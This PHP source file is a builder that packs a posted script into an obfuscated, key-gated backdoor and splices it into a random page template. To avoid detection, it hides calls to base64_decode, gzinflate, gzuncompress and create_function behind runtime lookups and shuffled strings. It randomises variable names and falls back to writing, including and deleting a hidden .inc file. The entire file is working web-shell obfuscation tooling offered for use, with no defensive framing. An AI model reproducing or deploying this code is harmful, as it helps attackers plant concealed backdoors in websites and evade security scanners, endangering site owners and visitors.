<?php

function randomStr($length, $charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
{
	$charactersLength = strlen($charset);
	$randomString = "";
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $charset[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function packScript($script) 
{
	$compressed = base64_encode(gzcompress(gzdeflate($script)));
	$from_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
	$to_charset = str_shuffle("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_");
	$varname_charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$r_vn = function () use ($varname_charset) { return '$' . randomStr(rand(4, 5), $varname_charset); };
    $nulls = array_fill(0, 16, null);
    $v_arr = array_map($r_vn, $nulls);
    list($ab, $cd, $aa, $a, $b, $c, $d, $e, $f, $h, $i, $j, $k, $l, $m, $q) = $v_arr;
	$shuffle = function ($str) use ($ab, $from_charset, $to_charset) { return "$ab('" . strtr($str, $from_charset, $to_charset) . "')"; };
	$code = <<<EOT
    $ab = function($cd) { return strtr($cd, '$to_charset', '$from_charset'); };
    $q = {$shuffle("get_defined_functions")};
    $aa = $q();
    $a = ${aa}[{$shuffle("internal")}];
    foreach ($a as $b => $c) {
        if (false !== strpos($c, {$shuffle("4_d")})) {
            $d = ${a}[$b];
            continue;
        }
        if (false !== strpos($c, {$shuffle("zinf")})) {
            $e = ${a}[$b];
            continue;
        }
        if (false !== strpos($c, {$shuffle("eate_fu")})) {
            $f = str_replace({$shuffle("sqlite_")}, "", ${a}[$b]);
            continue;
        }
        if (false !== strpos($c, {$shuffle("zunc")})) {
            $h = ${a}[$b];
            continue;
        }
    }
    $j = $e($h($d({$shuffle($compressed)})));
    if (isset($f) && function_exists($f)) {
        $m = {$shuffle("error_reporting")};
        if (function_exists($m)) {
            $m(constant({$shuffle("E_ALL")}) ^ constant({$shuffle("E_DEPRECATED")}));
        }
        \$g = $f('', $j);
    } else {
        \$g = function() use($ab, $j) {
            $i = __DIR__ . {$shuffle("/.inc")};
            $k = {$shuffle("file_put_contents")};
            $l = {$shuffle("unlink")};
            if (@$k($i, {$shuffle("<?php ")} . $j, constant({$shuffle("LOCK_EX")}))) {
                try {
                    include_once($i);
                    $l($i);
                } catch (Exception \$e) {
                    $l($i);
                    if ({$shuffle("die")} === \$e->{{$shuffle("getMessage")}}()) exit;
                }
            }
        };
    }
    \$g();
EOT;
    $oneline = str_replace(array("\r", "\n"), "", preg_replace("/^\s+/m", "", $code));
	return $oneline;
}

$source_script = base64_decode($_POST["script"]);
$templates_dir = __DIR__ . "/templates";
$files = array_diff(scandir($templates_dir), array("..", "."));
$template_file = $templates_dir . "/" . $files[array_rand($files, 1)];
$source_script_lines = explode(PHP_EOL, $source_script);
$start = 0;
foreach ($source_script_lines as $id => $line) {
    if (strpos($line, "INSERT_KEY")) {
        $start = $id + 1;
        break;
    }
}
$end = array_search("}", array_reverse($source_script_lines, true)) - $start;
$raw_script_lines = array_slice($source_script_lines, $start, $end);
$source_script_text = implode(PHP_EOL, $raw_script_lines);
$packed_script = 'if (@$_REQUEST["k"] === "INSERT_KEY") {' . packScript($source_script_text) . '}';
$template = file_get_contents($template_file);
$output = str_replace('{CODE}', $packed_script, $template);
echo $output;
die();